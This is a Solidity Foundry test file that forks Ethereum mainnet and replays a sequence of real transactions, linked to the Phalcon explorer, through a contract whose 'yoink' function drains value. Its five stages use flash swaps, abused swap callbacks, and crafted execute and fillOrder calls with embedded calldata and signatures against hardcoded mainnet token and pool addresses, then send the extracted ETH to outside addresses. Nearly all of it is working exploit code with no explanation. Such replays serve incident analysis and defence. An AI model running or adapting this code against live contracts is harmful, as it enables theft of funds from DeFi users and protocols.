// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// https://explorer.phalcon.xyz/tx/eth/0xecdd111a60debfadc6533de30fb7f55dc5ceed01dfadd30e4a7ebdb416d2f6b6
// https://etherscan.io/address/0xFDe0d1575Ed8E06FBf36256bcdfA1F359281455A

struct S2 {
    address p1;
    address p2;
    uint256 p3;
    uint256 p4;
    uint256 p5;
    bytes p6;
}

struct S1 {
    uint256 p1;
    address p2;
    address p3;
    address p4;
    address p5;
    address p6;
    uint256 p7;
    uint256 p8;
    uint256 p9;
    bytes p10;
}

interface I {
    function getReserves() external payable returns (uint112, uint112, uint32);
    function balanceOf(address) external payable returns (uint256);
    function transfer(address, uint256) external payable;
    function withdraw(uint256) external payable;
    function unlockToken(uint256) external payable;
    function deposit() external payable;
    function execute(S2 memory, bytes memory) external payable;
    function sync() external payable;
    function swap(address, bool, int256, uint160, bytes memory) external payable;
    function fillOrder(S1 memory, bytes memory, bytes memory, uint256, uint256, uint256) external payable;
    function execute(bytes memory, bytes[] memory) external payable;
    function swap(uint256, uint256, address, bytes memory) external payable;
    function approve(address, uint256) external payable;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256,
        uint256,
        address[] memory,
        address,
        uint256
    ) external payable;
}

contract X6980 is Test {
    address immutable r = address(this);
    receive() external payable {}

    function setUp() public pure {
        console2.log("0xecdd111a60debfadc6533de30fb7f55dc5ceed01dfadd30e4a7ebdb416d2f6b6");
    }

    address constant x0000 = 0x0000000000000000000000000000000000000000;
    address constant x01db = 0x01DB9De95067Cb33213D00000000000000000000;
    address constant x04dd = 0x04DD76803F247b611d4F470fC6cd206a9D02f869;
    address constant x0b6a = 0x0b6a06C07C58d13b6C725DbDB9CD1E2f6baC5527;
    address constant x1111 = 0x1111111254EEB25477B68fb85Ed929f73A960582;
    address constant x177b = 0x177BA0cac51bFC7eA24BAd39d81dcEFd59d74fAa;
    address constant x186e = 0x186eF81fd8E77EEC8BfFC3039e7eC41D5FC0b457;
    address constant x1db9 = 0x00000001DB9De95067Cb33213d00000000000000;
    address constant x1e4b = 0x1e4B7128871aC1317B02f31fbd0c54adbB5491a1;
    address constant x1f90 = 0x1f9090aaE28b8a3dCeaDf281B0F12828e676c326;
    address constant x229b = 0x229b8325bb9Ac04602898B7e8989998710235d5f;
    address constant x28d5 = 0x28D5dB99CB7817321884d102917cBE300114d558;
    address constant x3fc9 = 0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD;
    address constant x4675 = 0x4675C7e5BaAFBFFbca748158bEcBA61ef3b0a263;
    address constant x4838 = 0x4838B106FCe9647Bdf1E7877BF73cE8B0BAD5f97;
    address constant x4b0e = 0x4b0E9a7dA8bAb813EfAE92A6651019B8bd6c0a29;
    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
    address constant x656c = 0x656C00e1BcD96f256F224AD9112FF426Ef053733;
    address constant x760d = 0x760dc1E043D99394A10605B2FA08F123D60faF84;
    address constant x7a25 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address constant x9f11 = 0x9f11faF42A16D986F7BFd6338F41dB880da6DF39;
    address constant xa16a = 0xa16A5F37774309710711a8B4E83b068306b21724;
    address constant xb811 = 0xB8112A01744fe88bC8672Cd977378169E33eB9A5;
    address constant xc02a = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant xc70f = 0xC70f00CD7E461686b04B0E912E309becA8b80ea0;
    address constant xc82b = 0xc82BbE41f2cF04e3a8efA18F7032BDD7f6d98a81;
    address constant xcac6 = 0xCaC6f6711206215D9761F7B82936f2083964dfF5;
    address constant xdac1 = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant xdafe = 0xDAFEA492D9c6733ae3d56b7Ed1ADB60692c98Bc5;
    address constant xed4d = 0xEd4D5317823Ff7BC8BB868C1612Bb270a8311179;

    uint256 t_yoink = 0;

    function test1() public {
        // vm.startPrank(0xFDe0d1575Ed8E06FBf36256bcdfA1F359281455A, 0xFDe0d1575Ed8E06FBf36256bcdfA1F359281455A);

        vm.createSelectFork("http://localhost:18545", 18730462); // tx.blockNumber - 1
        // vm.createSelectFork("http://localhost:18545", bytes32(0x8bf0b3050c11bb81ca40977601a7a6c6fe933504da5fdb6191292b1d6bf1e3e3));

        // https://explorer.phalcon.xyz/tx/eth/0x8bf0b3050c11bb81ca40977601a7a6c6fe933504da5fdb6191292b1d6bf1e3e3
        this.x8bf0b305();
        // https://explorer.phalcon.xyz/tx/eth/0x18944e4fe74b6bd08942208db2e69899b297aafac5708596f33bbfb16998e6c5
        this.x18944e4f();
        // https://explorer.phalcon.xyz/tx/eth/0x4d13d47e36554dc5065e01db04ab11cb3e6c1bf780ace347dbde2eea685190d1
        this.x4d13d47e();
        // https://explorer.phalcon.xyz/tx/eth/0x5ae66286b8c2261e77f396464b75d640b90c91ddaf6353c4ae2aa09984db7645
        this.x5ae66286();
        // https://explorer.phalcon.xyz/tx/eth/0xecdd111a60debfadc6533de30fb7f55dc5ceed01dfadd30e4a7ebdb416d2f6b6
        this.yoink{value: 55}();
    }

    function test2() public {
        // vm.startPrank(0xFDe0d1575Ed8E06FBf36256bcdfA1F359281455A, 0xFDe0d1575Ed8E06FBf36256bcdfA1F359281455A);

        vm.createSelectFork("http://localhost:18545", 18727282); // tx.blockNumber - 1
        // https://explorer.phalcon.xyz/tx/eth/0x8bf0b3050c11bb81ca40977601a7a6c6fe933504da5fdb6191292b1d6bf1e3e3
        this.x8bf0b305();
        vm.warp(1701878507);
        vm.roll(18728339);
        // https://explorer.phalcon.xyz/tx/eth/0x18944e4fe74b6bd08942208db2e69899b297aafac5708596f33bbfb16998e6c5
        this.x18944e4f();
        vm.warp(1701883787);
        vm.roll(18728773);
        // https://explorer.phalcon.xyz/tx/eth/0x4d13d47e36554dc5065e01db04ab11cb3e6c1bf780ace347dbde2eea685190d1
        this.x4d13d47e();
        vm.warp(1701896231);
        vm.roll(18729795);
        // https://explorer.phalcon.xyz/tx/eth/0x5ae66286b8c2261e77f396464b75d640b90c91ddaf6353c4ae2aa09984db7645
        this.x5ae66286();
        vm.warp(1701904319);
        vm.roll(18730462);
        // https://explorer.phalcon.xyz/tx/eth/0xecdd111a60debfadc6533de30fb7f55dc5ceed01dfadd30e4a7ebdb416d2f6b6
        this.yoink{value: 55}();
    }

    function yoink() public payable {
        t_yoink++;

        if (t_yoink == 1) {
            I(x28d5).getReserves();

            bytes memory b01 = abi.encode(
                hex"cb0000000428d5db99cb7817321884d102917cbe300114d5580902f1ac00000144ed4d5317823ff7bc8bb868c1612bb270a8311179128acb080000000000000000000000006980a47bee930a4584b09ee79ebe46484fbdbdd000000000000000",
                72057594037927936,
                x1db9,
                309496643087556927962480640,
                11529215046068469760,
                9280511457131501678,
                hex"f81fd8e77eec8bffc3039e7ec41d5fc0b457a9059cbb000000000000000000000000ed4d5317823ff7bc8bb868c1612bb270a831117900000000000000000000",
                x01db,
                1729094026535273939327,
                hex"958d2ee523a2206206994597c13d831ec7a9059cbb00000000000000000000000028d5db99cb7817321884d102917cbe300114d5580000000000000000000000",
                542461286435475467907649376564139452
            );
            I(x28d5).swap(8773582149352286265661, 0, r, b01);

            // uint256 v1 = 47479370;
            uint256 v1 = I(xdac1).balanceOf(r);
            console2.log("I(xdac1).balanceOf(r)\t\t->", uint256(47479370));
            I(xdac1).transfer(xc70f, 47479369);
            x4838.call{value: 7133400000000000}("");
            return;
        }
        if (t_yoink == 2) {
            I(xb811).approve(x1111, type(uint256).max);
            // uint112 v1 = 8549450012775977;
            // uint112 v2 = 15087180031190772330;
            // uint32 v3 = 1701878399;
            (uint112 v1, uint112 v2, uint32 v3) = I(x1e4b).getReserves();
            console2.log("I(x1e4b).getReserves()\t->", v1, v2, v3);
            I(xc02a).deposit{value: 26977775061640078}();
            I(xc02a).transfer(x1e4b, 26977775061640078);
            I(x1e4b).swap(15214505382017, 0, r, "");

            bytes memory b05 =
                hex"bf15fcd8000000000000000000000000303389f541ff2d620e42832f180a08e767b28e10000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000242cc2878d0065783f74000000000000000b6a06c07c58d13b6c725dbdb9cd1e2f6bac552700000000000000000000000000000000000000000000000000000000";
            S1 memory s101 = S1(
                820604555655,
                xc02a,
                xb811,
                x0b6a,
                x0000,
                x0000,
                2341519272093589524,
                472808604076338,
                4421431254442149611168492388118363282642987198110904030635476664713216,
                b05
            );
            bytes memory b06 =
                hex"1cb4409a58e8e546c9c86724e5ac14d034c413cf92581969ae6c2cec9ce67447ff2f6b4b12df08323196c844f26af6297ccc493bd7541041e5e3aedbb0534e91";
            I(x1111)
                .fillOrder(
                    s101,
                    b06,
                    "",
                    0,
                    14605925166736,
                    57896044618658097711785492504343953926634992332820282019728792003956564819969
                );

            I(xc02a).withdraw(72333825928318553);
            x1f90.call{value: 1133901271666961}("");
            return;
        }
        if (t_yoink == 3) {
            I(xcac6).unlockToken{value: 1820000000000000000}(37);
            // uint256 v1 = 300000000000000000000;
            uint256 v1 = I(x177b).balanceOf(r);
            console2.log("I(x177b).balanceOf(r)\t\t->", "300000000000000000000 (300.0 ether)");
            I(x177b).transfer(x9f11, 299999999999999999999);
            // uint256 v2 = 2790294104593053231176;
            uint256 v2 = I(x177b).balanceOf(x9f11);
            console2.log("I(x177b).balanceOf(x9f11)\t->", "2790294104593053231176 (2790.2941 ether)");
            // uint112 v3 = 2490294104593053231177;
            // uint112 v4 = 15528342153881387171;
            // uint32 v5 = 1701813431;
            (uint112 v3, uint112 v4, uint32 v5) = I(x9f11).getReserves();
            console2.log("I(x9f11).getReserves()\t->", v3, v4, v5);
            I(x9f11).swap(0, 1665066664684700909, r, "");
            I(xc02a).withdraw(1665066664684700909);
            x229b.call{value: 605017142405801030}("");
            return;
        }
        if (t_yoink == 4) {
            bytes memory b07 = abi.encode(x656c, r, 1927771437000000000002);
            bytes[] memory arr02 = new bytes[](1);
            arr02[0] = b07;
            I(x3fc9).execute(hex"04", arr02);

            // uint256 v1 = 1927771437000000000002;
            uint256 v1 = I(x656c).balanceOf(r);
            console2.log("I(x656c).balanceOf(r)\t\t->", "1927771437000000000002 (1927.7714 ether)");

            bytes memory b08 = hex"cb06656c00e1bcd96f256f224ad9112ff426ef053733000000000000000016bc";
            I(x04dd).swap(r, true, 1927771437000000000001, 4295128740, b08);

            I(xc02a).withdraw(67219017838121188);
            x4675.call{value: 5646397498402179}("");
            return;
        }
        if (t_yoink == 5) {
            I(x4b0e).approve(x7a25, type(uint256).max);
            I(xc02a).deposit{value: 5000000000000000000}();

            address[] memory arr03 = new address[](2);
            arr03[0] = xc02a;
            arr03[1] = x4b0e;
            I(x7a25)
                .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                    5000000000000000000, 0, arr03, r, block.timestamp + 1
                );

            bytes memory b10 =
                hex"ac9650d8000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000003842966c680000000000000000000000000000000000000000c9112ec16d958e8da8180000760dc1e043d99394a10605b2fa08f123d60faf840000000000000000";
            S2 memory s201 = S2(xa16a, x4b0e, 0, 5000000, 0, b10);
            I(xc82b)
                .execute(
                    s201,
                    hex"9194983a3dbfb5779c09c95f5d830d8435d9ce88b383752c3dfb8a1b84b8c9f511b7c750f1334e2f26ca9be32c2d070a4a023edf745b02468d6cba9a15a494c61b"
                );

            I(x760d).sync();

            address[] memory arr06 = new address[](2);
            arr06[0] = x4b0e;
            arr06[1] = xc02a;
            I(x7a25)
                .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                    3455399346269045701666911322, 0, arr06, r, block.timestamp + 1
                );

            // uint256 v1 = 94513462587046838317;
            uint256 v1 = I(xc02a).balanceOf(r);
            console2.log("I(xc02a).balanceOf(r)\t\t->", "94513462587046838317 (94.5134 ether)");
            I(xc02a).withdraw(94513462587046838316);
            xdafe.call{value: 4923240442287576107}("");
            return;
        }
    }

    function x18944e4f() public {
        X6980(payable(r)).yoink{value: 25}();
    }

    function x5ae66286() public {
        X6980(payable(r)).yoink{value: 84}();
    }

    function x8bf0b305() public {
        X6980(payable(r)).yoink{value: 71334}();
    }

    function x4d13d47e() public {
        X6980(payable(r)).yoink{value: 981}();
    }

    function uniswapV3SwapCallback(int256, int256, bytes memory) public {
        I(x656c).transfer(x04dd, 1927771437000000000001);
    }

    function call() public payable {}

    function pancakeV3SwapCallback(int256, int256, bytes memory) public {
        I(x186e).transfer(xed4d, 8773582149352286265661);
    }

    function uniswapV2Call(address, uint256, uint256, bytes memory) public {
        I(x28d5).getReserves();

        bytes memory b03 = abi.encode(
            hex"cb00000044186ef81fd8e77eec8bffc3039e7ec41d5fc0b457a9059cbb000000000000000000000000ed4d5317823ff7bc8bb868c1612bb270a8311179000000",
            147196282813427566772827979776,
            23996
        );
        I(xed4d).swap(r, true, 8773582149352286265661, 4295128740, b03);

        I(xdac1).transfer(x28d5, 1752786950);
    }

    fallback() external payable {
        revert("no such function");
    }
}
